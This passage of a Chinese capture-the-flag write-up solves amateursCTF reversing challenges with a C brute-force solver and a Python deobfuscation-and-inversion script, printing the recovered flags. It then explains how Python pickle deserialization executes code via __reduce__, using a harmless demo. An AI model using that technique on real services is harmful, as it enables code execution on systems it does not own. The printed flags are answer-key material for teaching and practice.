<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mod = <span class="number">0x3B9ACA07</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[] = &#123;<span class="number">816696039</span>, <span class="number">862511530</span>, <span class="number">897431439</span>, <span class="number">341060728</span>, <span class="number">173157153</span>, <span class="number">31974957</span>, <span class="number">491987052</span>, <span class="number">513290022</span>, <span class="number">463763452</span>, <span class="number">949994705</span>, <span class="number">910803499</span>, <span class="number">303483511</span>, <span class="number">378099927</span>, <span class="number">773435663</span>, <span class="number">305463445</span>, <span class="number">656532801</span>, <span class="number">655150297</span>, <span class="number">28357806</span>, <span class="number">69914739</span>, <span class="number">213536453</span>, <span class="number">962912446</span>, <span class="number">458779691</span>, <span class="number">598643891</span>, <span class="number">94970179</span>, <span class="number">732507398</span>, <span class="number">792930123</span>, <span class="number">216371336</span>, <span class="number">680163935</span>, <span class="number">397010125</span>, <span class="number">693248832</span>, <span class="number">926462193</span>, <span class="number">419350956</span>, <span class="number">594922380</span>, <span class="number">944019434</span>, <span class="number">93600641</span>, <span class="number">116339550</span>, <span class="number">373995190</span>, <span class="number">558908218</span>, <span class="number">700841647</span>, <span class="number">703877327</span>, <span class="number">665247438</span>, <span class="number">690373754</span>, <span class="number">35138387</span>, <span class="number">389900716</span>, <span class="number">625740467</span>, <span class="number">682452898</span>, <span class="number">894528752</span>, <span class="number">603308386</span>, <span class="number">442640217</span>, <span class="number">15961938</span>, <span class="number">573068354</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">copy funcs here...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> check[<span class="number">8</span>];</span><br><span class="line">    <span class="comment">// memcpy(check, &quot;amateurs&quot;, 8);</span></span><br><span class="line">    <span class="comment">// for(unsigned int i = 0; i &lt;= 0xFF; i++)&#123;</span></span><br><span class="line">    <span class="comment">//     for(unsigned int j = 0; j &lt;= 0xFF; j++)&#123;</span></span><br><span class="line">    <span class="comment">//         unsigned int num = 0, n1 = 0, n2 = 0, f = 0;</span></span><br><span class="line">    <span class="comment">//         for(int c = 0; c &lt; 8; c++)&#123;</span></span><br><span class="line">    <span class="comment">//             n1 = ilproc(num, check[c]);</span></span><br><span class="line">    <span class="comment">//             n2 = func0(n1, i);</span></span><br><span class="line">    <span class="comment">//             num = func1(n2, j);</span></span><br><span class="line">    <span class="comment">//             if(num == enc[c])&#123;</span></span><br><span class="line">    <span class="comment">//                 f++;</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">    <span class="comment">//             else&#123;</span></span><br><span class="line">    <span class="comment">//                 break;</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//         if(f == 8)&#123;</span></span><br><span class="line">    <span class="comment">//             printf(&quot;Key: 0x%x, 0x%x\n&quot;, i, j);</span></span><br><span class="line">    <span class="comment">//             return 0;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="type">int</span> key[<span class="number">2</span>] = &#123;<span class="number">0xed</span>, <span class="number">0x29</span>&#125;;</span><br><span class="line">    <span class="built_in">string</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> num = <span class="number">0</span>, n1 = <span class="number">0</span>, n2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">51</span>; c++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> chr = <span class="number">0</span>; chr &lt;= <span class="string">&#x27;&#125;&#x27;</span>; chr++)&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> numtmp = num, n1tmp = n1, n2tmp = n2;</span><br><span class="line">          n1tmp = ilproc(num, chr);</span><br><span class="line">          n2tmp = func0(n1tmp, key[<span class="number">0</span>]);</span><br><span class="line">          numtmp = func1(n2tmp, key[<span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">if</span>(numtmp == enc[c])&#123;</span><br><span class="line">              flag += (<span class="type">char</span>)chr;</span><br><span class="line">              num = numtmp;</span><br><span class="line">              n1 = n1tmp;</span><br><span class="line">              n2 = n2tmp;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// amateursCTF&#123;r/programminghorror/comments/18x7vk9/&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="typo-pyre"><a href="#typo-pyre" class="headerlink" title="typo | pyre"></a>typo | pyre</h2><p>题目直接给了一个混淆变量名和函数名的<code>.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> RrRrRrrrRrRRrrRRrRRrrRr</span><br><span class="line">RrRrRrrrRrRRrrRRrRRrRrr = <span class="built_in">int</span>(<span class="string">&#x27;1665663c&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">RrRrRrrrRrRRrrRRrRRrrRr.seed(RrRrRrrrRrRRrrRRrRRrRrr)</span><br><span class="line">arRRrrRRrRRrRRRrRrRRrRr = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">arRRrrRrrRRrRRRrRrRRrRr = <span class="string">&#x27;\r&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">r&#x27;r\\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;rr\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;r\\&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r\\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">&#x27;\rr&#x27;</span></span><br><span class="line">arRRrrRRrRRrRrRrRrRRrRr = [</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;aRrRrrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRRrRrrRRrRR&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRrRrRrRRRrrRrrrR&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">arRRRrRRrRRrRRRrRrRRrRr = <span class="keyword">lambda</span> aRrRrRrrrRrRRrrRRrRrrRr: <span class="built_in">bytearray</span>([arRrrrRRrRRrRRRrRrRrrRr + <span class="number">1</span> <span class="keyword">for</span> arRrrrRRrRRrRRRrRrRrrRr <span class="keyword">in</span> aRrRrRrrrRrRRrrRRrRrrRr])</span><br><span class="line">arRRrrRRrRRrRRRrRrRrrRr = <span class="keyword">lambda</span> aRrRrRrrrRrRRrrRRrRrrRr: <span class="built_in">bytearray</span>([arRrrrRRrRRrRRRrRrRrrRr - <span class="number">1</span> <span class="keyword">for</span> arRrrrRRrRRrRRRrRrRrrRr <span class="keyword">in</span> aRrRrRrrrRrRRrrRRrRrrRr])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arRRrrRRrRRrRrRRrRrrRrRr</span>(<span class="params"><span class="built_in">hex</span></span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">list</span>], <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">list</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span></span><br><span class="line">arRRRRRRrRRrRRRrRrRrrRr = [arRRrrRRrRRrRrRRrRrrRrRr, arRRRrRRrRRrRRRrRrRRrRr, arRRrrRRrRRrRRRrRrRrrRr]</span><br><span class="line">arRRRRRRrRRrRRRrRrRrrRr = [RrRrRrrrRrRRrrRRrRRrrRr.choice(arRRRRRRrRRrRRRrRrRrrRr) <span class="keyword">for</span> arRrrrRRrRRrRRRrRrRrrRr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RrRrRrrrRrRRrrRRrRRrrRr</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ar:</span><br><span class="line">        arr = arRRRRRRrRRrRRRrRrRrrRr[r](arr)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arRRrrRRrRRrRrRRrRrrRrRr</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    ar = <span class="built_in">int</span>(ar.<span class="built_in">hex</span>(), <span class="number">17</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> arr:</span><br><span class="line">        ar += <span class="built_in">int</span>(r, <span class="number">35</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(ar)[<span class="number">2</span>:])</span><br><span class="line">arrRRrrrrRRrRRRrRrRRRRr = RrRrRrrrRrRRrrRRrRRrrRr(arRRrrRRrRRrRRRrRrRRrRr, arRRrrRrrRRrRRRrRrRRrRr.encode())</span><br><span class="line">arrRRrrrrRRrRRRrRrRRRRr = arRRrrRRrRRrRrRRrRrrRrRr(arRRrrRRrRRrRrRrRrRRrRr, arrRRrrrrRRrRRRrRrRRRRr)</span><br><span class="line"><span class="built_in">print</span>(arrRRrrrrRRrRRRrRrRRRRr.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># 5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3</span></span><br></pre></td></tr></table></figure>

<p>改一下变量和函数名程序的逻辑就很清晰了:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> rand</span><br><span class="line">data1 = <span class="built_in">int</span>(<span class="string">&#x27;1665663c&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">rand.seed(data1)</span><br><span class="line">data2 = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">data3 = <span class="string">&#x27;\r&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">r&#x27;r\\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;rr\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;r\\&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r\\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">&#x27;\rr&#x27;</span></span><br><span class="line">data4 = [</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;aRrRrrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRRrRrrRRrRR&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRrRrRrRRRrrRrrrR&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">lam1 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([each + <span class="number">1</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line">lam2 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([each - <span class="number">1</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params"><span class="built_in">hex</span></span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">list</span>], <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">list</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span></span><br><span class="line">func_table = [func1, lam1, lam2]</span><br><span class="line">func_table = [rand.choice(func_table) <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ar:</span><br><span class="line">        arr = func_table[r](arr)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    ar = <span class="built_in">int</span>(ar.<span class="built_in">hex</span>(), <span class="number">17</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> arr:</span><br><span class="line">        ar += <span class="built_in">int</span>(r, <span class="number">35</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(ar)[<span class="number">2</span>:])</span><br><span class="line">result = rand(data2, data3.encode())</span><br><span class="line">result = func1(data4, result)</span><br><span class="line"><span class="built_in">print</span>(result.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>用一个随机的函数表来对flag进行操作然后Base16 -&gt; Base17 每一个操作都是可逆的 只需要把它们写成逆操作再逆序执行加密时的函数就能逆向整个加密过程:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> rd</span><br><span class="line">seed = <span class="built_in">int</span>(<span class="string">&#x27;1665663c&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">rd.seed(seed)</span><br><span class="line">flag1 = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;0x5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3&quot;</span>[<span class="number">2</span>:])</span><br><span class="line">data1 = <span class="string">&#x27;\r&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">r&#x27;r\\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;rr\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;r\\&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r\\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">&#x27;\rr&#x27;</span></span><br><span class="line">data2 = [</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;aRrRrrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRRrRrrRRrRR&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRrRrRrRRRrrRrrrR&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">func1 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([(each - <span class="number">1</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line">func2 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([(each + <span class="number">1</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>(<span class="params"><span class="built_in">hex</span></span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span></span><br><span class="line">result = [func3, func1, func2]</span><br><span class="line">result = [rd.choice(result) <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rd</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ar[::-<span class="number">1</span>]:</span><br><span class="line">        arr = result[r](arr)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func4</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    ar = <span class="built_in">int</span>(ar.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> arr:</span><br><span class="line">        ar -= <span class="built_in">int</span>(r, <span class="number">35</span>)</span><br><span class="line">    hexn = <span class="number">0</span></span><br><span class="line">    <span class="comment"># ar = int(ar.hex(), 17)</span></span><br><span class="line">    <span class="keyword">while</span> ar &gt; <span class="number">0</span>:</span><br><span class="line">        hexn = (hexn * <span class="number">16</span>) + (ar % <span class="number">17</span>)</span><br><span class="line">        ar //= <span class="number">17</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>.fromhex(<span class="built_in">hex</span>(hexn)[<span class="number">2</span>:][::-<span class="number">1</span>])</span><br><span class="line">result2 = func4(data2, flag1)</span><br><span class="line">flag = rd(result2, data1.encode())</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># bytearray(b&#x27;amateursCTF&#123;4t_l3ast_th15_fl4g_isn7_misspelll3d&#125;&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="dill-with-it-py-deserialized-vuln"><a href="#dill-with-it-py-deserialized-vuln" class="headerlink" title="dill-with-it | py-deserialized vuln"></a>dill-with-it | py-deserialized vuln</h2><p><code>main.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 3.10.12</span></span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> loads</span><br><span class="line">larry = <span class="string">b&quot;\x80\x04ctypes\nFunctionType......\x93(VLooks like you got it!\nVNah, try again.\nlg4\n\x86R.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(loads(larry))</span><br></pre></td></tr></table></figure>

<p>给出了一串序列化的python代码 正常的序列化<code>python object</code> 可以通过dill库来完全还原源代码(要使用对应的python版本的dill或pickle库):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Python_object</span>():</span><br><span class="line">    ...</span><br><span class="line">dill.source.getsource(dill.loads(dill.dumps(Python_object)))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def Python_object():</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>但是这道题利用了反序列化的漏洞 因为反序列化实际上就是用PVM解释序列化的python代码 当序列化的类中出现类似<code>__reduce__()</code>的魔术方法 且其返回值形式为<code>(callable, (arg1, arg2, ...))</code>时 反序列化由这个类实例化的对象的序列化字符串时会直接执行<code>callable(arg1, arg2, ...)</code> 此时load(s)返回的就不是一个python object而是执行这个函数得到的返回值 例如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dill</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Test2</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (Test2, (<span class="number">1</span>, <span class="number">2</span>, ))</span><br><span class="line">t = Test()</span><br><span class="line">serialized = pickle.dumps(t)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(serialized))</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(serialized))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Test2\x94\x93\x94K\x01K\x02\x86\x94R\x94.&#x27;</span></span><br><span class="line"><span class="string">    0: \x80 PROTO      4</span></span><br><span class="line"><span class="string">    2: \x95 FRAME      30</span></span><br><span class="line"><span class="string">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span></span><br><span class="line"><span class="string">   21: \x94 MEMOIZE    (as 0)</span></span><br><span class="line"><span class="string">   22: \x8c SHORT_BINUNICODE &#x27;Test2&#x27;</span></span><br><span class="line"><span class="string">   29: \x94 MEMOIZE    (as 1)</span></span><br><span class="line"><span class="string">   30: \x93 STACK_GLOBAL</span></span><br><span class="line"><span class="string">   31: \x94 MEMOIZE    (as 2)</span></span><br><span class="line"><span class="string">   32: K    BININT1    1</span></span><br><span class="line"><span class="string">   34: K    BININT1    2</span></span><br><span class="line"><span class="string">   36: \x86 TUPLE2</span></span><br><span class="line"><span class="string">   37: \x94 MEMOIZE    (as 3)</span></span><br><span class="line"><span class="string">   38: R    REDUCE</span></span><br><span class="line"><span class="string">   39: \x94 MEMOIZE    (as 4)</span></span><br><span class="line"><span class="string">   40: .    STOP</span></span><br><span class="line"><span class="string">highest protocol among opcodes = 4</span></span><br><span class="line"><span class="string">None</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>其中<code>pickletools.dis(serialized)</code>可以用来打印可读性更高的PVM opcode 该版本的opcode释义如下:</p>
<table>
<thead>
<tr>
<th>MARK</th>
<th>&#x3D; b’(‘</th>
<th># push special markobject on stack</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>STOP</td>
<td>&#x3D; b’.’</td>
<td># every pickle ends with STOP</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>POP</td>
<td>&#x3D; b’0’</td>
<td># discard topmost stack item</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>POP_MARK</td>
<td>&#x3D; b’1’</td>
<td># discard stack top through topmost markobject</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>DUP</td>
<td>&#x3D; b’2’</td>
<td># duplicate top stack item</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FLOAT</td>
<td>&#x3D; b’F’</td>
<td># push float object; decimal string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>INT</td>
<td>&#x3D; b’I’</td>
<td># push integer or bool; decimal string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
